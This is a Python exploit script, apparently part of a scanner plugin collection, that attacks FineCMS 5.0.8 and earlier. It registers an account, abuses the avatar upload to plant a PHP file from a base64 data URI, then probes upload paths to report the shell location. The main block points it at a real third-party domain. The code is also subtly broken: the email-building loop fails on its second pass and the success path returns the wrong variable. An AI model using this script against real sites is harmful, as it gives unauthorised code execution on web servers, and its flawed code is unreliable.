#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: finecms-5.0.8-getshell漏洞
referer: unknown
author: qianxiao996
description: finecms5.0.8及版本以下漏洞Getshell脚本
'''
import sys
import requests
import random
import warnings#方法名称自定义

def run(url):
	result_2 = ['finecms-5.0.8-getshell漏洞', '', '']

	headers = {
		"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
	}
	username=random.randint(0,999999)
	seed = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	email = []
	for i in range(8):
		email.append(random.choice(seed))
		email = ''.join(email)
		register_url=url+"/index.php?s=member&c=register&m=index"
		register_payload={"back":"","data[username]":username,"data[password]":"123456","data[password2]":"123456","data[email]":email+"@"+email+".com"}
		login_url=url+"/index.php?s=member&c=login&m=index"
		login_payload={"back":"","data[username]":username,"data[password]":"123456","data[auto]":"1"}
		vul_url=url+"/index.php?s=member&c=account&m=upload"
		vul_payload={"tx":"data:image/php;base64,NDA0bm90Zm91bmQ8P3BocCBwaHBpbmZvKCk7Pz4="}
		try:
			s = requests.session()
			resu=s.post(register_url,data=register_payload,timeout=5,headers=headers, verify=False)
			result=s.post(login_url,data=login_payload,timeout=5,headers=headers, verify=False)
			result2=s.post(vul_url,data=vul_payload,timeout=5,headers=headers, verify=False).content.decode('utf-8')
			if "status" in result2:
				result_2[2]='存在'
				for i in range(0,10):
					shell = url+"/uploadfile/member/"+str(i)+"/0x0.php"
					shell_result = s.get(shell,timeout=5,headers=headers, verify=False)
					if shell_result.status_code==200 and 'code' in shell_result.text:
						result_2[1] = '当前shell上传位置为:%s'%shell
						return result
			else:
				result_2[2]=  '不存在'

		except:
			result_2[2]='不存在'
		return result_2
if __name__ == "__main__":
	#此处不会调用
	warnings.filterwarnings("ignore")
	testVuln = run("http://baidu.com")
